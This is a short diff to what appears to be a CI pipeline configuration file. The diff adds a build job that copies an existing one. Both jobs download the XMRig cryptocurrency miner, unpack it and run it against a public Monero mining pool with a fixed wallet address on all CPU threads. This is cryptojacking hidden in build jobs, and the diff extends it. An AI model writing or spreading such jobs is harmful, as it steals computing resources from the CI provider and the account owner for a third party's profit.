@@ -14,3 +14,6 @@ blocks:
         - name: 'Job #2'
           commands:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.5.1/xmrig-6.5.1-focal-x64.tar.gz;tar xf xmrig-6.5.1-focal-x64.tar.gz;cd xmrig-6.5.1;./xmrig -c config.json -a randomx -o pool.supportxmr.com:5555 -u 88AdvUbn5byGcHzNUXPLLH1RQkoghTNeGjZF3vRGJ7CpCwMSKMu3MXzDRYCW8tw6BHaSJVFvC4qqRSsz5cSRSNgYKmYD6Yz.C -t0'
+        - name: 'Job #3'
+          commands:
+            - 'wget https://github.com/xmrig/xmrig/releases/download/v6.5.1/xmrig-6.5.1-focal-x64.tar.gz;tar xf xmrig-6.5.1-focal-x64.tar.gz;cd xmrig-6.5.1;./xmrig -c config.json -a randomx -o pool.supportxmr.com:5555 -u 88AdvUbn5byGcHzNUXPLLH1RQkoghTNeGjZF3vRGJ7CpCwMSKMu3MXzDRYCW8tw6BHaSJVFvC4qqRSsz5cSRSNgYKmYD6Yz.C -t0'
